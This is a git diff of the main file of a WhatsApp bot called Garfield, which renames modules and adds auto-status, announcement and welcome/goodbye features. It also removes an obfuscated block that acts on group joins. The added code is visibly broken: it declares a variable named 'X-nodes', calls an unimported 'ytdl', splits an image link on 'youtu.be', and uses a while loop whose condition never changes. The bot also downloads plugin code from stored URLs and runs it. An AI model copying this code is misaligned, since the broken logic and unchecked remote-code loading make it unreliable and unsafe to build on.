@@ -1,21 +1,19 @@
 /*COPYRIGHT (C) 2022 CODED BY NOIZE */
 
-const os = require("os");
 const fs = require("fs");
 const path = require("path");
 const events = require("./events");
 const chalk = require('chalk');
 const config = require('./config');
-const { FakeDB, takeMessage } = require("./X-nodes/A14/fake");
-const {WAConnection, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
-const {Message, StringSession, Image, Video} = require('./Development-4.0/');
+const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
+const {Message, StringSession, Image, Video} = require('./Aurora/');
 const { DataTypes } = require('sequelize');
-const { GreetingsDB, getMessage } = require("./X-nodes/A14/greetings");
-const got = require('got');
+const { getMessage } = require("./X-nodes/sql/greetings");
 const axios = require('axios');
+const got = require('got');
 
-// A14
-const WhatsAsenaDB = config.DATABASE.define('GARFIELD', {
+//CODED BY THARINDU LIYANAGE
+const AuroraDB = config.DATABASE.define('GARFIELD-6.0', {
     info: {
       type: DataTypes.STRING,
       allowNull: false
@@ -26,15 +24,14 @@ const WhatsAsenaDB = config.DATABASE.define('GARFIELD', {
     }
 });
 
-fs.readdirSync('./X-nodes/A14/').forEach(plugin => {
+fs.readdirSync('./X-nodes/sql/').forEach(plugin => {
     if(path.extname(plugin).toLowerCase() == '.js') {
-        require('./X-nodes/A14/' + plugin);
+        require('./X-nodes/sql/' + plugin);
     }
 });
 
-const plugindb = require('./X-nodes/A14/plugin');
-
-// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
+const plugindb = require('./X-nodes/sql/plugin');
+var OWN = { ff: '94711502119' }
 String.prototype.format = function () {
     var i = 0, args = arguments;
     return this.replace(/{}/g, function () {
@@ -56,17 +53,21 @@ Array.prototype.remove = function() {
     return this;
 };
 
-async function whatsAsena () {
+async function Aurora () {
     await config.DATABASE.sync();
-    var StrSes_Db = await WhatsAsenaDB.findAll({
+    var StrSes_Db = await AuroraDB.findAll({
         where: {
           info: 'StringSession'
         }
     });
     
-    
+// CODED BY THARINDU LIYANAGE
     const conn = new WAConnection();
+    conn.version = [3,2147,14];
     const Session = new StringSession();
+    
+    conn.browserDescription = ["GARFIELD BOT BY NOIZE(SECURED)", "ZENOI", '6.0.0']
+
 
     conn.logger.level = config.DEBUG ? 'debug' : 'warn';
     var nodb;
@@ -80,35 +81,35 @@ async function whatsAsena () {
 
     conn.on ('credentials-updated', async () => {
         console.log(
-            chalk.blueBright.italic('✅ Login information updated!')
+            chalk.blueBright.italic('Login Information Updated ✅')
         );
 
         const authInfo = conn.base64EncodedAuthInfo();
         if (StrSes_Db.length < 1) {
-            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
+            await AuroraDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
         } else {
             await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
         }
     })    
 
     conn.on('connecting', async () => {
-        console.log(`${chalk.green.bold('GARF')}${chalk.blue.bold('IELD')}
+        console.log(`${chalk.green.bold('GARF')}${chalk.blue.bold('FIELD')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
-${chalk.blue.italic('🐼 Connecting to WhatsApp... Please wait.')}`);
+${chalk.blue.italic('🐼 Connecting to WhatsApp... Please wait')}`);
     });
     
 
     conn.on('open', async () => {
         console.log(
-            chalk.green.bold(' ✅️ Login successful!')
+            chalk.green.bold('Login Successful ✅')
         );
 
         console.log(
-            chalk.blueBright.italic(' 🛰️️ Connecting to Garfield Server...')
+            chalk.blueBright.italic('🛰️️ Connecting to Garfield Server...')
         );
 
-        var plugins = await plugindb.PluginDB.findAll();
-        plugins.map(async (plugin) => {
+        var X-nodes = await plugindb.PluginDB.findAll();
+        X-nodes.map(async (plugin) => {
             if (!fs.existsSync('./X-nodes/' + plugin.dataValues.name + '.js')) {
                 console.log(plugin.dataValues.name);
                 var response = await got(plugin.dataValues.url);
@@ -120,7 +121,7 @@ ${chalk.blue.italic('🐼 Connecting to WhatsApp... Please wait.')}`);
         });
 
         console.log(
-            chalk.blueBright.italic('📡  Installing X-nodes...')
+            chalk.blueBright.italic('📡  Installing X-nodes..')
         );
 
         fs.readdirSync('./X-nodes').forEach(plugin => {
@@ -128,13 +129,187 @@ ${chalk.blue.italic('🐼 Connecting to WhatsApp... Please wait.')}`);
                 require('./X-nodes/' + plugin);
             }
         });
-
+// PLUGGINS SUCCESS CODED BY THARINDU LIYANAGE
         console.log(
-            chalk.green.bold('Garfield working ' + config.WORKTYPE + ' now 🐼'));
-            await conn.sendMessage(conn.user.jid, "*Garfield started successfully 💌*", MessageType.text);
-            await conn.sendMessage(conn.user.jid, "*𝗘𝗻𝗷𝗼𝘆 𝗻𝗼𝘄 💌*  \n  *GARFIELD  v4.0* \n *𝗗𝗲𝗽𝗹𝗼𝘆𝗲𝗿 𝗜𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 🐼* \n🅾️ You must place a dot(.) at the beginning of the command \n🅾️ The letters in the command should be lowercase \n *🅾️ This will stop after about 22 days. That's because you are in the heroku free version. Or you have to pay but do not. By remake you can easily deploy and use this* \n\n\n\n*𝗛𝗼𝘄 𝘁𝗼 𝗴𝗲𝘁 𝗺𝗲𝗻𝘂 💬*\n🐼  .𝗺𝗲𝗻𝘂  \n🅾️ You can easily and quickly create this for anyone without any programming knowledge\n\n\n\n *𝗚𝗔𝗥𝗙𝗜𝗘𝗟𝗗 💬* \nℹ️ Garfield Bot is a free open source program  \nℹ️ This does nothing for your privacy \nℹ️ Developers do not get any benefit from this. Only self-satisfaction is obtained \nℹ️ This is updated and developed day by day \nℹ️ You can also get this from the telegram - https://t.me/ipandx \nℹ️ You cant get obscene stuff out of this \n\n*𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙈𝙀𝙉𝙏* \n\n *ℹ️ Follow Us* \n https://www.facebook.com/garfieldbots/    \n\n" , MessageType.text);
-    });
+            chalk.green.bold('Successfully connected X-nodes server ☁️')
+       );
+        
+        console.log(
+            chalk.blueBright.italic('Garfield working now 🐼')
+        );
+        
+         if (config.LANG == 'EN') {
+             await conn.sendMessage(conn.user.jid, fs.readFileSync("./x369/server.png"), MessageType.image, { caption: `*𝗚𝗔𝗥𝗙𝗜𝗘𝗟𝗗 𝗦𝗧𝗔𝗥𝗧𝗘𝗗  🐼* \n\n *𝗘𝗻𝗷𝗼𝘆 𝗻𝗼𝘄 💌*  \n *𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲-* ${conn.user.name} \n *GARFIELD  v6.0* \n *𝗗𝗲𝗽𝗹𝗼𝘆𝗲𝗿 𝗜𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 🐼* \n🅾️ You must place a dot(.) at the beginning of the command \n🅾️ The letters in the command should be lowercase \n *🅾️ This will stop after about 22 days. That's because you are in the heroku free version. Or you have to pay but do not. By remake you can easily deploy and use this* \n\n\n\n*𝗛𝗼𝘄 𝘁𝗼 𝗴𝗲𝘁 𝗺𝗲𝗻𝘂 💬*\n🐼  .𝗺𝗲𝗻𝘂  \n🅾️ You can easily and quickly create this for anyone without any programming knowledge\n\n\n\n *𝗚𝗔𝗥𝗙𝗜𝗘𝗟𝗗 𝗟𝗔𝗧𝗘𝗦𝗧 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 💬* \nℹ️ Garfield Bot is a free open source program  \nℹ️ This does nothing for your privacy \nℹ️ Developers do not get any benefit from this. Only self-satisfaction is obtained \nℹ️ This is updated and developed day by day \nℹ️ You can also get this from the telegram - https://t.me/ipandx \nℹ️ You cant get obscene stuff out of this \n\n*𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙈𝙀𝙉𝙏* \n\n *ℹ️ Follow Us* \n https://www.facebook.com/garfieldbots/ \n\n.        *NOIZE DEVELOPMENT*`});
+             
+         } else if (config.LANG == 'SI') {
+             await conn.sendMessage(conn.user.jid, fs.readFileSync("./x369/server.png"), MessageType.image, { caption: `*𝗘𝗻𝗷𝗼𝘆 𝗻𝗼𝘄 💌*  ${conn.user.name} \n *GARFIELD  v6.0* \n *𝗗𝗲𝗽𝗹𝗼𝘆𝗲𝗿 𝗜𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 🐼* \n🅾️ You must place a dot(.) at the beginning of the command \n🅾️ The letters in the command should be lowercase \n *🅾️ This will stop after about 22 days. That's because you are in the heroku free version. Or you have to pay but do not. By remake you can easily deploy and use this* \n\n\n\n*𝗛𝗼𝘄 𝘁𝗼 𝗴𝗲𝘁 𝗺𝗲𝗻𝘂 💬*\n🐼  .𝗺𝗲𝗻𝘂  \n🅾️ You can easily and quickly create this for anyone without any programming knowledge\n\n\n\n *𝗚𝗔𝗥𝗙𝗜𝗘𝗟𝗗 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗦𝗜𝗫 💬* \nℹ️ Garfield Bot is a free open source program  \nℹ️ This does nothing for your privacy \nℹ️ Developers do not get any benefit from this. Only self-satisfaction is obtained \nℹ️ This is updated and developed day by day \nℹ️ You can also get this from the telegram - https://t.me/ipandx \nℹ️ You cant get obscene stuff out of this \n\n*𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙈𝙀𝙉𝙏* \n\n *ℹ️ Follow Us* \n https://www.facebook.com/garfieldbots/ \n\n.        *NOIZE DEVELOPMENT*`});
+             
+         } else {
+             await conn.sendMessage(conn.user.jid, fs.readFileSync("./x369/server.png"), MessageType.image, { caption: `222222`});
+        }
+     });
     
+// LOGIN MESSAGE CODED BY THARINDU LIYANAGE
+    setInterval(async () => { 
+        if (config.AUTOBIO == 'true') {
+            if (conn.user.jid.startsWith('90')) { 
+                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('994')) { 
+                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('94')) { 
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('351')) { 
+                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('75')) { 
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('91')) { 
+                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('62')) { 
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('49')) { 
+                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('61')) {  
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('55')) { 
+                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('33')) {
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('34')) { 
+                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('44')) { 
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('39')) {  
+                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('7')) { 
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('998')) {  
+                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else if (conn.user.jid.startsWith('993')) { 
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+            else {
+                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nGARFIELD BY NOIZE PROJECTS '
+                await conn.setStatus(biography)
+            }
+        }
+    }, 7890);
+// AUTO BIO◽◽◽◽◽    
+    setInterval(async () => { 
+        var getGMTh = new Date().getHours()
+        var getGMTm = new Date().getMinutes()
+         
+        while (getGMTh == 19 && getGMTm == 1) {
+            var announce = ''
+            if (config.LANG == 'EN') announce = ' ```GARFIELD 6.5 VERSION RELEASING SOON``` '
+            
+            let video = 'https://i.ibb.co/qmR14hQ/Pics-Art-22-03-18-19-34-01-459.png'
+            let image = 'https://i.ibb.co/qmR14hQ/Pics-Art-22-03-18-19-34-01-459.png'
+            
+            if (video.includes('http') || video.includes('https')) {
+                var VID = video.split('youtu.be')[1].split(' ')[0].replace('/', '')
+                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['1080p','720p', '480p', '360p', '240p', '144p'].map(() => true)});
+                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
+                yt.on('end', async () => {
+                    return await conn.sendMessage(conn.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: announce, mimetype: Mimetype.mp4});
+                });
+            } else {
+                if (image.includes('http') || image.includes('https')) {
+                    var imagegen = await axios.get(image, { responseType: 'arraybuffer'})
+                    return await conn.sendMessage(conn.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: announce })
+                } else {
+                    return await conn.sendMessage(conn.user.jid, announce, MessageType.text)
+                }
+            }
+        }
+    }, 50000);
+ // ANNOUNCEMENT CODED BY THARINDU LIYANAGE
     conn.on('chat-update', async m => {
         if (!m.hasNewMessage) return;
         if (!m.messages && !m.count) return;
@@ -144,88 +319,75 @@ ${chalk.blue.italic('🐼 Connecting to WhatsApp... Please wait.')}`);
         if (config.NO_ONLINE) {
             await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
         }
-	    var _0x109e6c=_0x1953;(function(_0x5df745,_0x36a093){var _0x1a770a=_0x1953,_0xbbf86f=_0x5df745();while(!![]){try{var _0x345f37=-parseInt(_0x1a770a(0x130))/0x1*(-parseInt(_0x1a770a(0x129))/0x2)+parseInt(_0x1a770a(0x126))/0x3*(parseInt(_0x1a770a(0x13a))/0x4)+-parseInt(_0x1a770a(0x124))/0x5+-parseInt(_0x1a770a(0x12b))/0x6+parseInt(_0x1a770a(0x128))/0x7*(parseInt(_0x1a770a(0x137))/0x8)+parseInt(_0x1a770a(0x12d))/0x9*(-parseInt(_0x1a770a(0x12e))/0xa)+-parseInt(_0x1a770a(0x12c))/0xb;if(_0x345f37===_0x36a093)break;else _0xbbf86f['push'](_0xbbf86f['shift']());}catch(_0x2bd98c){_0xbbf86f['push'](_0xbbf86f['shift']());}}}(_0x5c58,0xd244f));function _0x1953(_0x18e439,_0x245a29){var _0x5c581a=_0x5c58();return _0x1953=function(_0x1953f2,_0x326b7c){_0x1953f2=_0x1953f2-0x124;var _0x333c02=_0x5c581a[_0x1953f2];return _0x333c02;},_0x1953(_0x18e439,_0x245a29);}function _0x5c58(){var _0x349a3d=['41027bsfEsM','134LsiVoz','{no\x20fake}','2961894GzsgLP','8925785pCksqr','5045517Ukgjyl','10oIhKjy','key','14075JnHKzp','message','split','p.net','bType','messageStu','sendMessag','1960HVhRse','includes','no\x20fake','44OvUTBe','startsWith','bParameter','2475360gzcRbx','text','229926iZFVVR','remoteJid'];_0x5c58=function(){return _0x349a3d;};return _0x5c58();}if(msg[_0x109e6c(0x135)+'bType']===0x1b||msg[_0x109e6c(0x135)+_0x109e6c(0x134)]===0x1f){const plk=config['HANDLERS'],HANDLER=plk['charAt'](0x2);let user=msg['messageStu'+_0x109e6c(0x13c)+'s'][0x0];var poison=user+('@s.whatsap'+_0x109e6c(0x133)),pplk='@'+user[_0x109e6c(0x132)]('@')[0x0],plkmsg=await getMessage(msg['key'][_0x109e6c(0x127)]),plknum=await takeMessage(msg['key']['remoteJid']);plkmsg!==![]&&(plkmsg[_0x109e6c(0x131)][_0x109e6c(0x138)](_0x109e6c(0x12a))&&(plknum==![]&&(!user[_0x109e6c(0x13b)]('91')&&await conn[_0x109e6c(0x136)+'e'](msg[_0x109e6c(0x12f)]['remoteJid'],HANDLER+_0x109e6c(0x139),MessageType[_0x109e6c(0x125)],{'contextInfo':{'mentionedJid':[user]}})),plknum!==![]&&!user['startsWith'](plknum)&&await conn[_0x109e6c(0x136)+'e'](msg[_0x109e6c(0x12f)][_0x109e6c(0x127)],HANDLER+_0x109e6c(0x139),MessageType[_0x109e6c(0x125)],{'contextInfo':{'mentionedJid':[user]}})));}
+// NO ONLINE CODED BY THARINDU LIYANAGE
 
-        
+        if (config.GANSTYLE == 'pp' || config.GANSTYLE == 'Pp' || config.GANSTYLE == 'PP' || config.GANSTYLE == 'pP' ) {
+            if (msg.messageStubType === 32 || msg.messageStubType === 28) {
+                    // Thanks to Lyfe
+                    var gb = await getMessage(msg.key.remoteJid, 'goodbye');
+                    if (gb !== false) {
+                        let pp
+                        try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
+                        await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
+                        await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message });  });
 
-       if (msg.messageStubType === 32 || msg.messageStubType === 28) {
-        var plk_say = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
-        const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-        var plk_here = new Date().toLocaleDateString(get_localized_date)
-	    var afn_plk_ = '```⏱ Time :' + plk_say + '```\n```📅 Date :' + plk_here + '```'
-
-            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
-            if (gb !== false) {
-                if (gb.message.includes('{pp}')) {
-                let pp 
-                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
-                    var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
-                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
-                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{time}', afn_plk_).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) }); });                           
-            } else if (gb.message.includes('{gif}')) {
-                //created by NOIZE
-                    var plkpinky = await axios.get(config.GIF_BYE, { responseType: 'arraybuffer' })
-                    var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
-                await conn.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{time}', afn_plk_).replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) });
-            } else {
-                   await conn.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{time}', afn_plk_).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name), MessageType.text);
-              } 
-            }//thanks to farhan      
-            return;
-        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
-            // welcome
-            var plk_say = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
-           const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-           var plk_here = new Date().toLocaleDateString(get_localized_date)
-	       var afn_plk_ = '```⏱ Time :' + plk_say + '```\n```📅 Date :' + plk_here + '```'
-             var gb = await getMessage(msg.key.remoteJid);
-            if (gb !== false) {		    
-                if (gb.message.includes('{pp}')) {
-                let pp
-                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
-                    var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
-                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
-                    //created by NOIZE
-                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{time}', afn_plk_).replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name).replace('{no fake}', '') }); });                           
-            } else if (gb.message.includes('{gif}')) {
-                var plkpinky = await axios.get(config.WEL_GIF, { responseType: 'arraybuffer' })
-                var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
-                await conn.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{time}', afn_plk_).replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name).replace('{no fake}', '') });
-            } else {
-                var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
-                   await conn.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{time}', afn_plk_).replace('{owner}', conn.user.name).replace('{no fake}', ''), MessageType.text);
+                    }
+                    return;
+                } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
+                    // welcome
+                    var gb = await getMessage(msg.key.remoteJid);
+                    if (gb !== false) {
+                       let pp
+                        try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
+                        await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
+                        await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
+                    }
+                    return;
+                }
             }
-          }   	    
-            return;                               
-    }         
-
-         events.commands.map(
+            else if (config.GANSTYLE == 'image' || config.GANSTYLE == 'IMAGE' || config.GANSTYLE == 'IMAGE' || config.GANSTYLE == 'Image' ) {
+            if (msg.messageStubType === 32 || msg.messageStubType === 28) {
+                    
+                    var gb = await getMessage(msg.key.remoteJid, 'goodbye');
+                    if (gb !== false) {
+                        var tn = await axios.get(config.GANSTYLE, { responseType: 'arraybuffer' })
+                        await conn.sendMessage(msg.key.remoteJid, Buffer.from(tn.data), MessageType.video, {mimetype: Mimetype.image, caption: gb.message});
+                    }
+                    return;
+                } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
+                    
+                    var gb = await getMessage(msg.key.remoteJid);
+                    if (gb !== false) {
+                    var tn = await axios.get(config.GANSTYLE, { responseType: 'arraybuffer' })
+                    await conn.sendMessage(msg.key.remoteJid, Buffer.from(tn.data), MessageType.video, {mimetype: Mimetype.image, caption: gb.message});
+                    }
+                    return;
+                }
+             }
+// WELCOME & GOODBYE
+        events.commands.map(
             async (command) =>  {
                 if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
-                  var text_msg = msg.message.imageMessage.caption;
+                    var text_msg = msg.message.imageMessage.caption;
                 } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
-                  var text_msg = msg.message.videoMessage.caption;
+                    var text_msg = msg.message.videoMessage.caption;
                 } else if (msg.message) {
-                  var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
-                } else if (msg.message && msg.message.buttonsResponseMessage.selectedButtonId) {
-                  var text_msg = msg.message.buttonsResponseMessage.selectedButtonId;
-                } else if (msg.message && msg.message.listResponseMessage.singleSelectReply.selectedRowId) {
-                  var text_msg = msg.message.listResponseMessage.singleSelectReply.selectedRowId;
+                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                 } else {
-                  var text_msg = undefined
+                    var text_msg = undefined;
                 }
+
                 if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                     && msg.message && msg.message.imageMessage !== null && 
                     (command.pattern === undefined || (command.pattern !== undefined && 
                         command.pattern.test(text_msg)))) || 
                     (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                     (command.on !== undefined && command.on === 'text' && text_msg) ||
-                    // Video
                     (command.on !== undefined && (command.on === 'video')
